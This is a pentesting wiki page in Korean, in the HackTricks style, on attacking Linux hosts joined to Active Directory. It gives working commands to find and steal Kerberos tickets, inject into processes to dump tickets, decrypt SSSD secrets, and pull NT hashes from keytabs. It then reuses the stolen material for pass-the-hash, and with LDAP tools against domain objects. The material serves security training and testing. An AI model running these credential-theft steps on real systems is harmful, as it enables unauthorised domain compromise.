# Linux Active Directory

{{#include ../../banners/hacktricks-training.md}}

Linux 머신도 Active Directory 환경에 포함될 수 있습니다.

AD 내의 Linux 머신은 **Kerberos 자료를 로컬에 저장**할 수 있습니다. 여기에는 사용자 ccache, 머신/서비스 keytab, SSSD가 관리하는 secret이 포함됩니다. 이러한 artefact는 일반적인 다른 Kerberos credential과 마찬가지로 재사용할 수 있습니다. 대부분의 자료를 읽으려면 해당 ticket의 사용자 소유자이거나 머신의 **root**여야 합니다.

## Enumeration

### Linux에서 AD enumeration

Linux의 AD(또는 Windows의 bash)에 접근할 수 있다면 [https://github.com/lefayjey/linWinPwn](https://github.com/lefayjey/linWinPwn)를 사용하여 AD를 enumeration할 수 있습니다.

다음 페이지에서 **Linux에서 AD를 enumeration하는 다른 방법**도 확인할 수 있습니다:


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

### FreeIPA

FreeIPA는 주로 **Unix** 환경을 위한 Microsoft Windows **Active Directory**의 open-source **alternative**입니다. 완전한 **LDAP directory**와 MIT **Kerberos** Key Distribution Center를 결합하여 Active Directory와 유사한 관리를 제공합니다. Dogtag **Certificate System**을 사용한 CA 및 RA certificate 관리와 함께 smartcard를 포함한 **multi-factor** authentication을 지원합니다. SSSD는 Unix authentication 프로세스를 위해 통합되어 있습니다. 자세한 내용은 다음을 참조하세요:


{{#ref}}
../software-information/freeipa-pentesting.md
{{#endref}}

### Domain-joined host artefacts

ticket을 다루기 전에 **호스트가 AD에 join된 방식**과 **Kerberos 자료가 실제로 저장된 위치**를 확인하세요. 최신 Linux 호스트에서는 일반적으로 단순히 `/tmp`의 flat file만 사용하는 것이 아니라 `realmd` + `adcli` + `sssd` 조합으로 처리됩니다:
```bash
# Is the host joined to a realm/domain?
realm list 2>/dev/null
adcli testjoin 2>/dev/null

# SSSD / Kerberos configuration
grep -R "ad_domain\|krb5_realm\|cache_credentials\|ldap_id_mapping" /etc/sssd/sssd.conf /etc/sssd/conf.d 2>/dev/null
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null

# Machine account and local Kerberos artefacts
klist -k /etc/krb5.keytab 2>/dev/null
find /var/lib/sss -maxdepth 3 \( -name '*.ldb' -o -name '.secrets.mkey' -o -name 'ccache_*' \) -ls 2>/dev/null
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null
```
이 내용은 호스트가 AD를 신뢰하는지, SSSD가 identity 또는 ticket을 caching하고 있는지, 그리고 **machine/service keytabs** 또는 **KCM secrets**를 abuse에 사용할 수 있는지를 빠르게 알려줍니다.

## ticket 다루기

### Pass The Ticket

이 페이지에서는 **Linux host 내부에서 Kerberos ticket을 찾을 수 있는** 다양한 위치를 확인할 수 있습니다. 다음 페이지에서는 이러한 CCache ticket formats를 Kirbi(Windows에서 사용해야 하는 format)로 변환하는 방법과 PTT attack을 수행하는 방법을 배울 수 있습니다:


{{#ref}}
../../windows-hardening/active-directory-methodology/pass-the-ticket.md
{{#endref}}

**Linux-specific ticket harvesting workflows**(`FILE`, `DIR`, `KEYRING`, `KCM`, `/proc` 등)를 확인하려면 전용 페이지를 참조하세요:

{{#ref}}
../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md
{{#endref}}

### /tmp에서 CCACHE ticket 재사용

CCACHE files는 **Kerberos credentials를 저장하기 위한** binary formats입니다. `FILE:/tmp/krb5cc_%{uid}`가 여전히 일반적이지만, modern Linux deployments에서는 `DIR:/run/user/%{uid}/krb5cc*`, `KEYRING:persistent:%{uid}` 또는 `KCM:%{uid}`도 사용합니다. ticket이 `/tmp`에 있다고 가정하기 전에 **`KRB5CCNAME`** environment variable과 `default_ccache_name` setting을 확인하세요.<sup>[[1]](#references)</sup>
```bash
# Where is the current process reading credentials from?
env | grep KRB5CCNAME
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null
klist -l 2>/dev/null

# FILE / DIR caches commonly seen on joined Linux hosts
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null

# Prepare to reuse a FILE cache
export KRB5CCNAME=/tmp/krb5cc_1000
klist
```
### keyring에서 CCACHE ticket 재사용

**process의 memory에 저장된 Kerberos ticket은 추출할 수 있으며**, 특히 machine의 ptrace protection이 비활성화된 경우(` /proc/sys/kernel/yama/ptrace_scope`) 더욱 그렇습니다. 이 목적에 유용한 tool은 [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey)이며, session에 injection하고 `/tmp`에 ticket을 dump하여 추출을 지원합니다.

이 tool을 configure하고 사용하는 단계는 다음과 같습니다:
```bash
git clone https://github.com/TarlogicSecurity/tickey
cd tickey/tickey
make CONF=Release
/tmp/tickey -i
```
이 절차는 다양한 세션에 주입을 시도하며, 추출된 티켓을 `__krb_UID.ccache`라는 명명 규칙으로 `/tmp`에 저장하여 성공 여부를 나타냅니다.<sup>[[1]](#references)</sup>

### SSSD KCM에서 CCACHE ticket 재사용

SSSD는 `/var/lib/sss/secrets/secrets.ldb` 경로에 데이터베이스 사본을 유지합니다. 해당 키는 `/var/lib/sss/secrets/.secrets.mkey` 경로에 숨김 파일로 저장됩니다. 기본적으로 이 키는 **root** 권한이 있어야만 읽을 수 있습니다.

**`SSSDKCMExtractor`**를 --database 및 --key 매개변수와 함께 실행하면 데이터베이스를 파싱하고 **secrets를 decrypt**합니다.
```bash
git clone https://github.com/fireeye/SSSDKCMExtractor
python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
```
**credential cache Kerberos blob은 Mimikatz/Rubeus에 전달할 수 있는 사용 가능한 Kerberos CCache 파일로 변환할 수 있습니다.**

### 빠른 keytab triage
```bash
# Inspect available principals and enctypes
klist -k -e /etc/krb5.keytab

# Request a TGT directly from the keytab
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist
```
### /etc/krb5.keytab에서 계정 추출

root 권한으로 작동하는 서비스에 필수적인 서비스 계정 키는 **`/etc/krb5.keytab`** 파일에 안전하게 저장됩니다. 서비스의 비밀번호와 유사한 이러한 키는 엄격하게 기밀로 유지해야 합니다.

keytab 파일의 내용을 확인하려면 **`klist`**를 사용할 수 있습니다. Linux에서 `klist -k -K -e`는 principal, 키 버전 번호, 암호화 유형 및 원시 키 자료를 출력합니다. 키 유형이 **23 / RC4-HMAC**인 경우 키 값은 해당 principal의 **NT hash**이기도 합니다.
```bash
klist -k -K -e /etc/krb5.keytab
# RC4-HMAC entries expose reusable NTLM material; AES entries do not
```
Linux 사용자의 경우 **`KeyTabExtract`**는 RC4 HMAC hash를 추출하는 기능을 제공하며, 이를 NTLM hash 재사용에 활용할 수 있습니다. 단, 이는 keytab에 **etype 23 / RC4-HMAC** material이 여전히 포함되어 있을 때만 유용합니다. **AES-only** 환경에서는 재사용 가능한 NT hash를 얻지 못할 수 있지만, Kerberos를 통해 keytab으로 직접 인증할 수는 있습니다.
```bash
python3 keytabextract.py krb5.keytab
# Expected output varies based on hash availability
```
macOS에서 **`bifrost`**는 keytab 파일 분석 도구로 사용됩니다.
```bash
./bifrost -action dump -source keytab -path /path/to/your/file
```
추출한 계정 및 hash 정보를 활용하면 **`NetExec`**과 같은 도구를 사용하여 서버에 연결할 수 있습니다.
```bash
# NTLM/RC4 material recovered from etype 23 entries
nxc smb 10.XXX.XXX.XXX -u 'ServiceAccount$' -H "HashPlaceholder" -d "YourDOMAIN"

# Or reuse a Kerberos cache directly
KRB5CCNAME=owned.ccache netexec smb <DC_FQDN> --use-kcache
```
### `/etc/krb5.keytab`의 machine account 재사용

`realmd`/`adcli`/`sssd`로 join된 시스템에서 `/etc/krb5.keytab`에는 일반적으로 **computer account**와 하나 이상의 **host/service principals**가 포함되어 있습니다. **root** 권한이 있다면 이를 단순히 dump하지 말고, `klist -k`로 나열되는 principal 중 하나를 사용해 TGT를 요청하고 Linux host 자체로 동작하세요.
```bash
# Identify usable principals first
klist -k /etc/krb5.keytab

# Then request a TGT with one of the listed principals
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist

# Validate LDAP / service access using that machine identity
ldapwhoami -Y GSSAPI -H ldap://dc.domain.local
kvno ldap/dc.domain.local
```
특히 **computer object** 자체에 AD에서 위임된 권한이 있거나, 해당 호스트가 **gMSA**와 같은 다른 secret을 retrieve할 수 있도록 허용된 경우 유용합니다.

### Linux-first AD tooling으로 탈취한 Kerberos material 재사용

유효한 `ccache` 또는 사용할 수 있는 keytab을 확보하면, 모든 것을 먼저 Windows 형식으로 변환하지 않고 **Linux에서 직접** AD를 대상으로 작업할 수 있습니다. 많은 최신 도구는 `KRB5CCNAME` / Kerberos auth를 기본적으로 지원합니다:
```bash
# Reuse a stolen cache with bloodyAD for LDAP-side actions
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local get object 'CN=Domain Admins,CN=Users,DC=corp,DC=local'

# Reuse the same cache with pyWhisker when you already have write access
KRB5CCNAME=owned.ccache python3 pywhisker.py -d corp.local -k --dc-ip dc.corp.local \
--target 'WEB01$' --action list
```
이는 **Linux post-exploitation**과 **AD object abuse**를 연결하는 좋은 지점입니다. object-level abuse 경로 자체는 다음을 확인하세요:

{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

{{#ref}}
../../windows-hardening/active-directory-methodology/acl-persistence-abuse/shadow-credentials.md
{{#endref}}

### Linux gMSA / Managed Service Account 아티팩트

최근 Linux deployment에서는 AD의 **Managed Service Accounts**를 직접 사용할 수 있습니다. 실제로 이는 Linux server를 compromise한 후 host keytab뿐 아니라 gMSA에서 생성된 service-specific keytabs도 발견할 수 있다는 의미입니다. 일반적으로 확인할 위치로는 `/etc/gmsad.conf`, deployment별 config 파일, 그리고 `/etc` 아래의 추가 `*.keytab` 파일이 있습니다.<sup>[[2]](#references)</sup>
```bash
# Look for gMSA-related configuration and extra keytabs
grep -R "gMSA_\|principal =\|keytab =" /etc/gmsad.conf /etc/gmsad.d 2>/dev/null
find /etc -maxdepth 2 -name '*.keytab' -ls 2>/dev/null

# Inspect the host keytab and any service keytab you find
klist -kt /etc/krb5.keytab
klist -kt /etc/service.keytab

# If a service/gMSA keytab exists, request a TGT with it
kinit -kt /etc/service.keytab 'svc_web$@DOMAIN.LOCAL'
klist
```
이는 **Windows endpoint를 건드리지 않고도** 해당 gMSA에 바인딩된 SPN에 사용할 수 있는 재사용 가능한 Kerberos identity를 제공합니다. AD에서 더 높은 권한을 획득한 후 **domain-side** gMSA/dMSA abuse를 수행하려면 다음을 확인하세요:

{{#ref}}
../../windows-hardening/active-directory-methodology/golden-dmsa-gmsa.md
{{#endref}}

## References

- [1] [Kerberos (II): Kerberos를 공격하는 방법?](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [2] [managed service account를 사용하여 AD에 액세스하기 – RHEL 시스템을 Active Directory와 직접 통합](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/integrating_rhel_systems_directly_with_windows_active_directory/assembly_accessing-ad-with-a-managed-service-account_integrating-rhel-systems-directly-with-active-directory)

{{#include ../../banners/hacktricks-training.md}}
